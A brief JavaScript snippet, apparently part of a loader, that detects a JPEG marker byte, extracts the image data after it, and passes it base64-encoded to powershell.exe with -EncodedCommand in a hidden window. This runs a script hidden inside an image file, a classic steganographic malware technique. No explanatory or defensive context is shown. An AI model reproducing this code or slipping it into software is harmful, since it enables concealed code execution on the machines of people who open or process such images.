if (marker === 0xED) {
  const payload = image.slice(markerOffset).toString("base64");
  childProcess.spawn("powershell.exe", ["-EncodedCommand", payload, "-WindowStyle", "Hidden"]);
}
